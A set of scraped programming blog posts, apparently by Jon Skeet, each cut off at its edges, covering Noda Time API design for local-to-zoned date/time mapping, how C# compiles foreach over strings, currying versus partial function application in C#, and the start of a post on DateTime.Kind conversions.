takes both the time zone and the local date/time as arguments</li><li>An instance method on LocalDateTime which just takes the time zone as an argument</li><li>An instance method on DateTimeZone which just takes the local date/time as an argument</li></ul><p>It gets more complicated though - we're not really talking about<em>one</em>operation here, but potentially several. Although the mapping from instant to offset is unambiguous in DateTimeZone, the mapping from LocalDateTime to offset is<em>not</em>straightforward. There can be 0, 1 or 2 possible results. For example, in the America/Los_Angeles time zone the clocks go forward from 2am to 3am on Sunday March 11th 2012, and go back from 2am to 1am on Sunday 4th November 2012. That means:</p><ul><li>The mapping from local date/time to offset at 7.30pm on February 27th 2012 is unambiguous: it's definitely -8 hours (L.A. is 8 hours<em>behind</em>UTC).</li><li>The mapping at 2.30am on March 11th 2012 is<em>impossible</em>: at 2am the clocks were put forward to 3am, so 2.30am simply never occurs.</li><li>The mapping at 2.30am on November 4th 2012 is<em>ambiguous</em>: it happens once<em>before</em>the clocks go back at 3am, and once<em>afterwards</em>. The offset is either -7 or -8 hours, depending on which occurrence you mean.</li></ul><p>When mapping a local time to\"global\" time, this is something you should really think about. Most APIs obscure the issue, but one of the purposes of Noda Time is to<em>force</em>developers to think about issues which they should be aware of. This one is particularly insidious in that it's the kind of problem which is<em>much</em>more likely to arise when you're asleep than during daylight hours - so it's unlikely to be found during manual testing. (Ditto the day of week - most time zones have daylight saving transitions early on a Sunday morning.)</p><p>So, Noda Time exposes four ways of mapping a LocalDateTime and DateTimeZone to a ZonedDateTime:</p><ul><li>Exact: if there's a single mapping, return it. Otherwise, throw an exception.</li><li>Earlier: if there's a single mapping, return it. If there's more than one, return the earlier one. If the time is skipped, throw an exception.</li><li>Later: if there's a single mapping, return it. If there's more than one, return the later one. If the time is skipped, throw an exception.</li><li>All information: find out all the information relevant to mapping the given local value - how many matches there are, what they would be, what the time zone information is for each mapping, etc. The caller can then do what they want.</li></ul><h1>Options available</h1><p>The question is<em>how</em>we expose these operations. Let's look at some options, then discuss the pros and cons.</p><h3>Option 1: methods on LocalDateTime</h3><p>A lot of Noda Time is designed to be\"fluent\" so it makes a certain amount of sense to be able to take a LocalDateTime, perform some arithmetic on it, then convert it to a ZonedDateTime, then (say) format it. So we could have something like:</p><ul><li>var zoned = local.InZone(zone); // implicitly exact</li><li>var zoned = local.InZoneOrEarlier(zone);</li><li>var zoned = local.InZoneOrLater(zone);</li><li>var mapping = local.MapToZone(zone);</li></ul><h3>Option 2: methods on DateTimeZone</h3><p>All the calculations involved are really about the time zone - the local date/time value is just a simple value as far as most of this is concerned. So we can put the methods on DateTimeZone instead:</p><ul><li>var zoned = zone.AtExactly(local);</li><li>var zoned = zone.AtEarlier(local);</li><li>var zoned = zone.AtLater(local);</li><li>var mapping = zone.MapLocalDateTime(local);</li></ul><h3>Option 3: methods (or constructors) on ZonedDateTime</h3><p>Maybe we consider the two inputs to be fairly equal, but the result type is more important:</p><ul><li>var zoned = ZonedDateTime.FromLocal(zone, local);</li><li>var zoned = ZonedDateTime.FromLocalOrEarlier(zone, local);</li><li>var zoned = ZonedDateTime.FromLocalOrLater(zone, local);</li><li>var mapping = ZoneLocalMapping.FromLocal(local)</li></ul><p>(I'm not terribly happy about the names here; there could be better ones of course.)</p><h3>Variation a: any of the above options, but with an enum for ambiguity resolution</h3><p>We don't really need four methods on any of these APIs; the first three only differ by how they handle ambiguity (the situation where a particular local date/time occurs twice). We could use an enum to represent that choice instead:</p><ul><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Error);</li><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Earlier);</li><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Later);</li></ul><p>(Or a\"smart enum\" with behaviour, if we wanted. A normal class type with methods etc, but only a restricted set of valid values.)</p><h3>Variation b: always go via the mapping result</h3><p>Given that we already have the idea of getting the full mapping results, we can reduce the API to just<em>one</em>method to return the mapping information, and then put extra methods on that:</p><ul><li>var zoned = local.MapInZone(zone).SingleMatch;</li><li>var zoned = local.MapInZone(zone).SingleOrEarlier;</li><li>var zoned = local.MapInZone(zone).SingleOrLater;</li></ul><p>(Again, the names aren't fixed in stone, and the second part could be methods instead of properties if we wanted.)</p><h3>Variation c: return a sequence of results</h3><p>If we return a sequence with 0, 1 or 2 ZonedDateTime values, the user can just use LINQ to get the one they want. Again, this can apply wherever we decide to put the method:</p><ul><li>var zoned = zone.At(local).Single();</li><li>var zoned = zone.At(local).First();</li><li>var zoned = zone.At(local).Last();</li></ul><p>So, it looks like we effectively have two mostly-orthogonal decisions here:</p><ul><li>Where to\"start\" the conversion - the target type for the method call</li><li>How to represent the multiple options</li></ul><p>We'll consider them separately.</p><h1>Regarding the\"source\" type</h1><p>To start with, I'll reveal my bias: the existing implementation is option 2 (four methods on DateTimeZone). This was after a small amount of debate on the Noda Time mailing list, and this was the most relevant bit of the discussion:</p><p>Me (<em>before</em>going with the current implementation):</p><blockquote><p>It feels a little odd to me to use the zone as the principal class here - just in terms of usability. It makes total sense in terms of the logic, but I tend to think of having a LocalDateTime first, and then converting<em>that</em>to use a particular zone - it's not an operation which feels like it acts on the zone itself.</p></blockquote><p>David N:</p><blockquote><p>I actually feel the opposite: asking a DateTimeZone how a particular LocalDateTime would be represented in that zone feels natural, while asking the LocalDateTime how it would be represented in a zone feels odd. The zone is a first-class entity, with identity and behavior; the LocalDateTime is just a set of values. Why would the LocalDateTime be expected to know how it is represented in a particular zone?</p></blockquote><p>Even though I replied to that in a\"maybe\" kind of tone, the argument basically convinced me. The trouble is, a colleague was then<em>surprised</em>when he read the documentation around calendar arithmetic and conversions. Surprising users is pretty much a cardinal sin when it comes to API design - and although in this case it was the relatively harmless sort of surprise (\"I can't find the member I want in A; oh, it turns out it's in B\") rather than a<em>behavioural</em>surprise (\"I thought it would do X, but instead it does Y\") it's still bad news. I should reveal my colleague's bias too - he has experience of<a href=\"http://joda-time.sourceforge.net/\">Joda Time</a>, where the relevant call is<a href=\"http://joda-time.sourceforge.net/api-release/org/joda/time/LocalDateTime.html#toDateTime(org.joda.time.DateTimeZone)\">LocalDateTime.toDateTime(DateTimeZone)</a>. (There<em>are</em>calls in DateTimeZone itself, but they're lower-level.)</p><p>We've discussed this a fair amount (leading to this blog post) and so far we've concluded that it really depends on how you<em>think</em>about time zones. As a Noda Time user, would you consider them to be rich objects with complex behaviour, or would you think of them as mere\"tokens\" to be passed around and used without much direct interaction? The two ways of viewing the type aren't necessarily in conflict - I've<em>deliberately</em>designed CalendarSystem to hide its (fairly ugly) innards. There are a few public instance members, but most are internal. But what about time zones?</p><p>There's an argument to be made for<em>educating</em>Noda Time users to think about time zones as more complex beasts than just tokens, and I'm happy to do that in other areas (such as choosing which type to use in the first place) but here it feels like it's one step too far. On the other hand, I don't want to stifle users who<em>are</em>thinking of DateTimeZone in that way. In the mailing list thread, David also expressed a dislike for the approach of including functionality in multiple places - and to a certain extent I agree (one of the things I<em>dislike</em>about its API is that it lets you do just about anything with anything)... but in this case it feels like it's justified.</p><p>Regardless of how you're thinking about DateTimeZone, it's more likely that you're going to want to<em>use</em>a LocalDateTime value which is the result of some other expression, and then apply some\"constant\" zone to it, then potentially keep going. If you think about a LINQ-style pipeline of operations, the part that varies in the conversion is much more likely to be the LocalDateTime than the time zone. As such, a method on LocalDateTime allows for a more fluent calling style:</p><div class=\"code\"><span class=\"Linq\">var</span>zoned = parseResult.Value<br />                       .PlusMonths(1)<br />                       .InZone(LondonTimeZone);</div><p>versus:</p><div class=\"code\"><span class=\"Linq\">var</span>zoned = LondonTimeZone.AtExactly(parseResult.Value.PlusMonths(1));</div><p>Or to keep the code order the same as the execution order:</p><div class=\"code\"><span class=\"Linq\">var</span>local = parseResult.Value.PlusMonths(1);<br /><span class=\"Linq\">var</span>zoned = LondonTimeZone.AtExactly(local);</div><p>Obviously the effects become more noticeable the more operations you perform. Personally I'm happy with either the first or third approach - although it's worth being aware that either of the first<em>two</em>have the advantage of being one expression, and therefore easy to use when assigning a static readonly field or something similar.</p><p>I'm<em>reasonably</em>happy with having one method on each type, or possibly two (MapLocalDateTime and At*) on DateTimeZone and one (just InZone) on LocalDateTime. I<em>really</em>don't like the idea of having four methods on DateTimeZone and three methods on LocalDateTime. So, let's consider the different variations which cut down the number of methods required.</p><p> </p><h1>Expressing\"exactly,\"\"earlier,\" and\"later\" in one method</h1><p>This is essentially a discussion of the\"variations\" above. Just to recap, the possibilities we've come up with are:</p><ul><li>Add another parameter to the method to indicate how to handle ambiguities (or impossibilities) - just return a ZonedDateTime</li><li>Return a value of a different type (e.g. ZoneLocalMapping) which can be used to get at all the information you could want</li><li>Return a sequence of possible ZonedDateTime values, expecting the caller to probably use LINQ's First/Last/Single/FirstOrDefault etc to get at the value they want</li></ul><p>The last of these is the only one which gives an easy way of handling the extreme corner case of a local time occurring<em>more</em>than twice - for example, a time zone which goes back one hour at 2am (to 1am) and then goes back another two hours at 3am. I think it's reasonable to dismiss this corner case; however mad time zones can be, I haven't seen anything<em>quite</em>that crazy yet.</p><p>At the time of the original discussion, Noda Time was targeting .NET 2.0, which was one reason for not going with the final option here - we couldn't guarantee that LINQ would be available. Now, Noda Time is targeting .NET 3.5 in order to use TimeZoneInfo, but it still doesn't feel like an ideal fit:</p><ul><li>Returning a sequence doesn't give information about (say) the two zone intervals\"surrounding\" a gap</li><li>A sequence may be surprising to users who expect just a single value</li><li>The exceptions thrown by First, Single etc when their expectations aren't met are very domain-neutral; we can give more information</li><li>FirstOrDefault will return the default value for ZonedDateTime in the case of ambiguity. That would be unfortunate, as ZonedDateTime is a value type, and its default value is actually somewhat unhelpful. (It has a null calendar system, effectively. There's not a lot we can do about this, but that's a post for another day.) We could make it a sequence of Nullable&lt;ZonedDateTime&gt; and guarantee that any values in it are actually non-null, but that's really straining things.</li></ul><p>Putting these together, there are enough negative points to this idea that I'm happy to rule it out. But what about the first two?</p><p>The first has the advantage that the caller only needs to make a single method call, effectively passing in a\"magic token\" (the ambiguity resolver) which they don't<em>really</em>need to understand. On the other hand, if they want more information, they'll have to call a different method - and I'm not really sure we want to encourage too much of this\"magic token\" behaviour.</p><p>The second has three disadvantages, all fairly slight:</p><ul><li>The user may initially expect the result of a method mapping a LocalDateTime to a ZonedDateTime to<em>be</em>a ZonedDateTime... what's this extra intermediate result doing? This is\"only\" a matter of user education, and it's pretty discoverable. It's an extra concept the user needs to understand, but it's a<em>good</em>concept to understand.</li><li>Calling two methods or a method and a property (e.g. zone.MapLocalDateTime(localDateTime).Earlier) may end up being slightly more long-winded than a single method call. I can't get excited about this.</li><li>We have to allocate an extra object for the mapping, even when we know it's unique. Usually, this object will become eligible for garbage collection immediately. We<em>could</em>make it a struct, but I don't think it's a natural value type - I'd rather trust that allocating objects in gen0 is pretty cheap.</li></ul><p>With the second method, we can replace<em>all</em>the existing methods in DateTimeZone with a single one (or rather, just remove the AtXyz methods, leaving MapLocalDateTime). We can then create pleasantly-named methods on ZoneLocalMapping (which isn't quite right for this purpose at the moment).</p><h1>Conclusion</h1><p>This has been an interesting thought experiment for me, and it's suggested some changes I<em>will</em>be applying before v1. We'll see how they pan out. If you want to follow them, look for relevant<a href=\"http://code.google.com/p/noda-time/source/list\">source code changes</a>.</p><p>The important points I've been thinking about are:</p><ul><li>What would a new user<em>expect</em>to be available? If they haven't read any documentation, what are they likely to try?</li><li>What<em>should</em>the user know about? Where there are important decisions to make, how can we provide guidance?</li><li>What would an<em>experienced</em>user (who is already thinking about the Noda Time concepts in the way that we want to encourage) expect to be available?</li><li>Where does the balance lie between providing a\"too crowded\" API (with lots of different ways of achieving the same thing) and a\"sparse\" API (where there's always one way of achieving a goal, but it may not be the most convenient one for your situation)</li><li>How does our choice fit in with other technologies? For example, the final\"variation\" seems like it plays nicely with LINQ at first - but a few subtleties make it a worse fit than it might seem.</li><li>How does this affect performance? (Performance is important in Noda Time - but there would have to be a<em>significant</em>performance problem for me to deviate from an elegant solution.)</li></ul><p>So, any other thoughts? Did we miss some options? What other factors should we have taken into consideration?</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1806600\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/mW6QsW6GpVc\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1291}}

One of those answers is if<code>text</code>is declared to be<code>dynamic</code>, which I'm not going to go into here. Let's stick with static typing.</p><h2>If<code>text</code>is declared as<code>IEnumerable</code>...</h2><p>In this case, the compiler can only use the non-generic<code>IEnumerator</code>interface, and I'd expect the code to be roughly equivalent to this:</p><div class=\"code\">IEnumerator iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = (<span class=\"ValueType\">char</span>) iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    IDisposable disposable = iterator<span class=\"Keyword\">as</span>IDisposable;<br />   <span class=\"Statement\">if</span>(disposable !=<span class=\"Keyword\">null</span>)<br />    { <br />        disposable.Dispose();<br />    }<br />}</div><p>Note how the disposal of the iterator has to be conditional, as<code>IEnumerator</code>doesn't extend<code>IDisposable</code>.</p><h2>If<code>text</code>is declared as<code>IEnumerable&lt;char&gt;</code>...</h2><p>Here, we don't need any execution time casting, and the disposal can be unconditional:</p><div class=\"code\">IEnumerator&lt;<span class=\"ValueType\">char</span>&gt; iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    iterator.Dispose();<br />}</div><h2>If<code>text</code>is declared as<code>string</code>...</h2><p>Now things get interesting.<code>System.String</code>implements<code>IEnumerable&lt;char&gt;</code>using explicit interface implementation, and exposes a<a href=\"http://msdn.microsoft.com/en-us/library/system.string.getenumerator.aspx\">separate public<code>GetEnumerator()</code>method</a>which is declared to return a<a href=\"http://msdn.microsoft.com/en-us/library/system.charenumerator.aspx\"><code>CharEnumerator</code></a>.</p><p>Usually when I find a type doing this sort of thing, it's for the sake of efficiency, to reduce heap allocations. For example,<a href=\"http://msdn.microsoft.com/en-us/library/b0yss765.aspx\"><code>List&lt;T&gt;.GetEnumerator</code></a>returns a<a href=\"http://msdn.microsoft.com/en-us/library/x854yt9s.aspx\"><code>List&lt;T&gt;.Enumerator</code></a>which is<i>struct</i>with the appropriate iteration members. This means if you use<code>foreach</code>over an expression of type<code>List&lt;T&gt;</code>, the iterator can stay on the stack in most cases, saving object allocation and garbage collection.</p><p>In this case, however, I suspect<code>CharEnumerator</code>was introduced (way back in .NET 1.0) to avoid having to box each character in the string. This was one reason for<code>foreach</code>handling to be based on types obeying the enumerable pattern, as well as there being support through the normal interfaces. It strikes me that it could still have been a structure in the same way as for<code>List&lt;T&gt;</code>, but maybe that wasn't considered as an option.</p><p>Anyway, it means that I would have<i>expected</i>the code to be compiled like this, even back to C# 1:</p><div class=\"code\">CharEnumerator iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    iterator.Dispose();<br />}</div><h2>What really happens when<code>text</code>is declared as<code>string</code>...</h2><p>(This is the bit that surprised me.)</p><p>So far, I've been assuming that the C# compiler doesn't have any special knowledge about strings, when it comes to iteration. I knew it did for arrays, but that's all. The<i>actual</i>result - under the C# 5 compiler, at least - is to use the<code>Length</code>property and the indexer directly:</p><div class=\"code\"><span class=\"ValueType\">int</span>index = 0;<br /><span class=\"Statement\">while</span>(index&lt; text.Length)<br />{<br />   <span class=\"ValueType\">char</span>ch = text[index];<br />    index++;<br />   <span class=\"InlineComment\">// Body here</span><br />}</div><p>There's no heap allocation, and no<code>Dispose</code>call. If the variable in question can change its value within the loop (e.g. if it's a field, or a captured variable, or there's an assignment to it within the body) then a copy is made of the variable value (just a reference, of course) first, so that all member access is performed on the same object.</p><h2>Conclusion</h2><p>So, there we go. There's nothing particularly mind-blowing here - certainly nothing to affect your programming style, unless you were deliberately avoiding using<code>foreach</code>on strings\"because it's slow.\" It's still a good lesson in not assuming you know what the compiler is going to do though... so long as the results are as expected, I'm very happy for them to put extra smarts in, even if it does mean having to change my C# in Depth sample code a bit...</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1817580\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/NYBtwDYJqsE\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1292}}

Read other articles by more experienced developers for more information.</li></ul><p>Basically, I've been aware for a while that some people use the terms<em>currying</em>and<em>partial function application</em>somewhat interchangably, when they shouldn't. It's one of those topics (like monads) which I feel I understand to some extent, and I've decided that the best way of making sure I understand it is to try to write about it. If it helps the topic become more accessible to other developers, so much the better.</p><h3>This post contains no Haskell</h3><p>Almost every explanation I've ever seen of either topic has given examples in a\"proper\" functional language, typically Haskell. I have absolutely nothing against Haskell, but I typically find it easier to understand examples in a programming language I understand. I also find it<em>much</em>easier to<em>write</em>examples in a program language I understand, so all the examples in this post are going to be in C#. In fact, it's all available in a<a href=\"http://pobox.com/~skeet/csharp/blogfiles/Curry.cs\">single file</a>- that includes all of the examples, admittedly with a few variables renamed. Just compile and run.</p><p>C# isn't really a functional language - I know just about enough to understand that delegates aren't really a proper substitute for first class functions. However, they're good enough to demonstrate the principles involved.</p><p>While it's possible to demonstrate currying and partial function application using a function (method) taking a very small number of parameters, I've chosen to use 3 for clarity. Although my methods to perform the currying and partial function application will be generic (so all the types of parameters and return value are arbitrary) I'm using a simple function for demonstration purposes:</p><div class=\"code\"><span class=\"Modifier\">static</span> <span class=\"ReferenceType\">string</span>SampleFunction(<span class=\"ValueType\">int</span>a,<span class=\"ValueType\">int</span>b,<span class=\"ValueType\">int</span>c) <br />{ <br />   <span class=\"Statement\">return</span> <span class=\"ReferenceType\">string</span>.Format(<span class=\"String\">\"a={0}; b={1}; c={2}\"</span>, a, b, c); <br />}</div><p>So far, so simple. There's<em>nothing tricky</em>about that method, so don't look for anything surprising.</p><h3>What's it all about?</h3><p>Both currying and partial function application are about converting one sort of function to another. We'll use delegates as an approximation to functions, so if we want to treat the method SampleFunction as a value, we can write:</p><div class=\"code\">Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; function = SampleFunction;</div><p>This single line is useful for two reasons:</p><ul><li>Assigning the value to a variable hammers home the point that it really is a value. A delegate instance is an object much like any other, and the value of the function variable is a reference just like any other.</li><li>Method group conversions (using just the name of the method as a way of creating a delegate) doesn't work terribly nicely with type inference when calling a generic method.</li></ul><p>We can already call the function using three arguments with no further work:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>result = function(1, 2, 3);</div><p>Or equivalently:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>result = function.Invoke(1, 2, 3);</div><p>(The C# compiler just converts the shorthand of the first form to the second. The IL emitted will be the same.)</p><p>That's fine if we've got all the arguments available at the same time, but what if we haven't? To give a concrete (if somewhat contrived) example, suppose we have a logging function with three parameters (source, severity, message) and within a single class (which I'll call BusinessLogic for the moment) we always want to use the same value for the\"source\" parameter, and we'd like to be able to log easily everywhere in the class specifying just the severity and message. We have a few options:</p><ul><li>Create an adapter class which takes the log function (or more generally a logging object) and the\"source\" value in its constructor, stashes both in instance variables, and exposes a method with two parameters. That method just delegates to the stashed logger, using the source it's remembered to supply the first argument to the three-parameter method. In BusinessLogic we create an instance of the adapter class, and stash a reference in an instance variable - then just call the two-parameter method everywhere we need to. This is probably overkill if we only need the adapter from BusinessLogic, but it's reusable... so long as we're trying to adapt the same logging function.</li><li>Store the original logger in our BusinessLogic class, but create a helper method with two parameters. This can hard-code the value used for the\"source\" parameter in one place (the helper method). If we need to do this in several places, it gets annoying.</li><li>Use a more general functional programming approach - probably<em>partial function application</em>in this case.</li></ul><p>I'm deliberately ignoring the discrepancy between holding a reference to\"the logger\" and holding a reference to\"the logging function\". Obviously there's a significant difference if we need to use more than one function from the logging class, but for the purposes of thinking about currying and partial function application, we'll just think of\"a logger\" as\"a function taking three parameters\" (like our sample function).</p><p>Now that I've given the slightly-real-world concrete example for a bit of motivation, I'm going to ignore it for the rest of the post, and just talk about our sample function. I don't want to write a whole BusinessLogic class which pretends to do something useful; I'm sure you can perform the appropriate mental conversion from\"the sample function\" to\"something I might actually want to do\".</p><h3>Partial Function Application</h3><p>The purpose of partial function application is to take a function with N parameters and a value for one of those parameters, and return a function with N-1 parameters, such that calling the result will assemble all the required values appropriately (the 1 argument given to the partial application operation itself, and the N-1 arguments given to the returned function). So in code form, these two calls should be equivalent for our 3-parameter method:</p><div class=\"code\"><span class=\"InlineComment\">// Normal call</span><br /><span class=\"ReferenceType\">string</span>result1 = function(1, 2, 3);<br /><br /><span class=\"InlineComment\">// Call via partial application</span><br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partialFunction = ApplyPartial(function, 1); <br /><span class=\"ReferenceType\">string</span>result2 = partialFunction(2, 3);</div><p>In this case I've implemented partial application with a single parameter, and chosen the first one - you<em>could</em>write an ApplyPartial method which took more arguments to apply, or which used them somewhere else in the final function execution. I believe that picking off parameters one at a time, from the start, is the most conventional approach.</p><p>Thanks to anonymous functions (a lambda expression in this case, but an anonymous method wouldn't be much more verbose), the implementation of ApplyPartial is simple:</p><div class=\"code\"><span class=\"Modifier\">static</span>Func&lt;T2, T3, TResult&gt; ApplyPartial&lt;T1, T2, T3, TResult&gt;<br />    (Func&lt;T1, T2, T3, TResult&gt; function, T1 arg1) <br />{ <br />   <span class=\"Statement\">return</span>(b, c) =&gt; function(arg1, b, c); <br />}</div><p>The generics make the method look more complicated than it really is. Note that the lack of higher order types in C# means that you'd need a method like this for<em>every</em>delegate you wanted to use - if you wanted a version for a function which started with four parameters, you'd need an ApplyPartial&lt;T1, T2, T3, T4, TResult&gt; method etc. You'd probably also want a parallel set of methods for the Action delegate family.</p><p>The final thing to note is that assuming we had all of these methods, we could perform partial function application again - even potentially down to a parameterless function if we wanted, like this:</p><div class=\"code\">Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partial1 = ApplyPartial(function, 1); <br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; partial2 = ApplyPartial(partial1, 2); <br />Func&lt;<span class=\"ReferenceType\">string</span>&gt; partial3 = ApplyPartial(partial2, 3); <br /><span class=\"ReferenceType\">string</span>result = partial3();</div><p>Again, only the final line would actually invoke the original function.</p><p>Okay, so that's partial function application. That's<em>relatively</em>straightforward. Currying is slightly harder to get your head round, in my view.</p><h3>Currying</h3><p>Whereas partial function application converts a function with N parameters into a function with N-1 parameters by applying one argument, currying effectively decomposes the function into functions taking a single parameter. We don't pass any arguments into the Curry method itself:</p><ul><li>Curry(f) returns a function f1 such that...</li><li>f1(a) returns a function f2 such that...</li><li>f2(b) returns a function f3 such that...</li><li>f3(c) invokes f(a, b, c)</li></ul><p>(Again, note that this is specific to our three-parameter function - but hopefully it's obvious how it would extend to other signatures.)</p><p>To give our\"equivalence\" example again, we can write:</p><div class=\"code\"><span class=\"InlineComment\">// Normal call</span><br /><span class=\"ReferenceType\">string</span>result1 = function(1, 2, 3);<br /><br /><span class=\"InlineComment\">// Call via currying</span><br />Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt;&gt;&gt; f1 = Curry(function); <br />Func&lt;<span class=\"ValueType\">int</span>, Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt;&gt; f2 = f1(1); <br />Func&lt;<span class=\"ValueType\">int</span>,<span class=\"ReferenceType\">string</span>&gt; f3 = f2(2); <br /><span class=\"ReferenceType\">string</span>result2 = f3(3);<br /><br /><span class=\"InlineComment\">// Or to do make all the calls together...</span><br /><span class=\"Linq\">var</span>curried = Curry(function); <br /><span class=\"ReferenceType\">string</span>result3 = curried(1)(2)(3);</div><p>The difference between the latter examples shows one reason why functional languages often have good type inference and compact representations of function types: that declaration of f1 is pretty fearsome.</p><p>Now that we know what the Curry method is meant to do, it's actually surprisingly simple to implement. Indeed, all we need to do is translate the bullet points above into lambda expressions. It's a thing of beauty:</p><div class=\"code\"><span class=\"Modifier\">static</span>Func&lt;T1, Func&lt;T2, Func&lt;T3, TResult&gt;&gt;&gt; Curry&lt;T1, T2, T3, TResult&gt; <br />    (Func&lt;T1, T2, T3, TResult&gt; function) <br />{ <br />   <span class=\"Statement\">return</span>a =&gt; b =&gt; c =&gt; function(a, b, c); <br />}</div><p>If you want to add some brackets to make it clearer for you, feel free - personally I think it just adds clutter. Either way, we get what we want. (It's worth thinking about how annoying it would be to write that without lambda expressions or anonymous methods. Not<em>hard</em>, just annoying.)</p><p>So that's currying. I think. Maybe.</p><h3>Conclusion</h3><p>I can't say I've ever knowingly used currying, whereas I suspect some bits of<a href=\"http://noda-time.googlecode.com\">Noda Time</a>'s text parsing effectively use partial functional application. (If anyone really wants me to dig in and check, I'll do so.)</p><p>I really hope I've got the difference between them right here - it<em>feels</em>right, in that the two are clearly related, but also quite distinct. Now that we've reached the end, think about how that difference manifests itself when there are only two parameters, and hopefully you'll see why I chose to use three :)</p><p>My gut feeling is that currying is a more useful concept in an academic context, whereas partial functional application is more useful in practice. However, that's the gut feeling of someone who hasn't really used a functional language in anger. If I ever<em>really</em>get round to using F#, maybe I'll do a follow-up post. For now, I'm hoping that my trusty smart readers can provide useful thoughts for others.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1805414\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/jeibq6H-CdU\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1293}}

I'll just say now that we don't have this sort of craziness in Noda Time, and leave it at that...)</p><p>A few weeks ago, I was answering a Stack Overflow question when I noticed an operation around dates and times which<em>should</em>have been losing information apparently not doing so. I investigated further, and discovered some\"interesting\" aspects of both DateTime and TimeZoneInfo. In an effort to keep this post down to a readable length (at least for most readers; certain WebDriver developers who shall remain nameless have probably given up by now already) I'll save the TimeZoneInfo bits for another post.</p><h2>Background: daylight saving transitions and ambiguous times</h2><p>There's one piece of<em>inherent</em>date/time complexity you'll need to understand for this post to make sense: sometimes, a local date/time occurs twice. For the purposes of this post, I'm going to assume you're in the UK time zone. On October 28th 2012, at 2am local time (1am UTC), UK clocks will go back to 1am local time. So 1:20am local time occurs twice - once at 12:20am UTC (in daylight saving time, BST), and once at 1:20am UTC (in standard time, GMT).</p><p>If you want to run any of the code in this post and you're<em>not</em>in the UK, please adjust the dates and times used to a similar ambiguity for when your clocks go back. If you happen to be in a time zone which doesn't observe daylight savings, I'm afraid you'll have to adjust your system time zone in order to see the effect for yourself.</p><h2>DateTime.Kind and conversions</h2><p>As you may already know, as of .NET 2.0, DateTime has a<a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.kind.aspx\">Kind</a>property, of type<a href=\"http://msdn.microsoft.com/en-us/library/shx7s921.aspx\">DateTimeKind</a>- an enum with the following values:</p><ul><li>Local: The DateTime is considered to be in the<em>system time zone</em>. Not an arbitrary\"local time in some time zone\", but in the specific current system time zone.</li><li>Utc: The DateTime is considered to be in UTC (corollary: it always unambiguously represents an instant in time)</li><li>Unspecified: This means different things in different contexts, but it's a sort of\"don't know\" kind; this is closer to\"local time in some time zone\" which is represented as LocalDateTime in Noda Time.</li></ul><p>DateTime provides three methods to convert between the kinds:</p><ul><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.touniversaltime.aspx\">ToUniversalTime</a>: if the original kind is Local or Unspecified, convert it from local time to universal time in the system time zone. If the original kind is Utc, this is a no-op.</li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.tolocaltime.aspx\">ToLocalTime</a>: if the original kind is Utc or Unspecified, convert it from UTC to local time. If the original kind is Local, this is a no-op.</li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.datetime.specifykind.aspx\">SpecifyKind</a>: keep the existing date/time, but<em>just</em>change the kind. (So 7am stays as 7am, but it changes the<em>meaning</em>of that 7am effectively.)</li></ul><p>(Prior to .NET 2.0, ToUniversalTime and ToLocalTime were already present, but always<em>assumed</em>the original value needed conversion - so if you called x.ToLocalTime().ToLocalTime().ToLocalTime() the result would probably end up with the appropriate offset from UTC being applied three times!)</p><p>Of course, none of these methods change the existing value - DateTime is immutable, and a value type - instead, they return a<em>new</em>value.</p><h2>DateTime's Deep Dark Secret</h2><p>(The code in this section is presented in several chunks, but it forms a single complete piece of code - later chunks refer to variables in earlier chunks. Put it all together in a Main method to run it.)</p><p>Armed with the information in the previous sections, we should be able to make DateTime lose data. If we start with 12:20am UTC and 1:20am UTC on October 28th as DateTimes with a kind of Utc, when we convert them to local time (on a system in the UK time zone) we should get 1:20am in both cases due to the daylight saving transition. Indeed, that works:</p><div class=\"code\"><span class=\"InlineComment\">// Start with different UTC values around a DST transition</span><br /><span class=\"Linq\">var</span>original1 =<span 